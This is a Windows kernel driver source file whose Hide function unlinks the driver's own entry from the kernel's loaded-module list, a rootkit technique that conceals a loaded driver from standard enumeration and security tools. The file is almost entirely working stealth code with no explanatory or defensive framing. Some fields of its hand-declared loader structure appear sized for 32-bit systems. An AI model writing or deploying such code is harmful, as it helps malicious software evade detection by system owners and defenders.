#include <ntddk.h>

typedef unsigned short WORD;

typedef struct _LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	WORD LoadCount;
	WORD TlsIndex;
	ULONG SectionPointer;
	ULONG CheckSum;
	ULONG TimeDateStamp;
	ULONG EntryPointActivationContext;
	ULONG PatchInformation;
	LIST_ENTRY ForwarderLinks;
	LIST_ENTRY ServiceTagLinks;
	ULONG ContextInformation;
	ULONG OriginalBase;
	ULONG LoadTime1;
	ULONG LoadTime2;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

VOID Hide(PDRIVER_OBJECT DriverObject)
{
	PLDR_DATA_TABLE_ENTRY current = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
	PLDR_DATA_TABLE_ENTRY previous = (PLDR_DATA_TABLE_ENTRY)current->InLoadOrderLinks.Blink;
	PLDR_DATA_TABLE_ENTRY forward = (PLDR_DATA_TABLE_ENTRY)current->InLoadOrderLinks.Flink;

	previous->InLoadOrderLinks.Flink = current->InLoadOrderLinks.Flink;
	forward->InLoadOrderLinks.Blink = current->InLoadOrderLinks.Blink;

	current->InLoadOrderLinks.Flink = (PLIST_ENTRY)current;
	current->InLoadOrderLinks.Blink = (PLIST_ENTRY)current;
}

NTSTATUS UnloadDriver(PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);
	return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);
	Hide(DriverObject);
	DriverObject->DriverUnload = UnloadDriver;
	return STATUS_SUCCESS;
}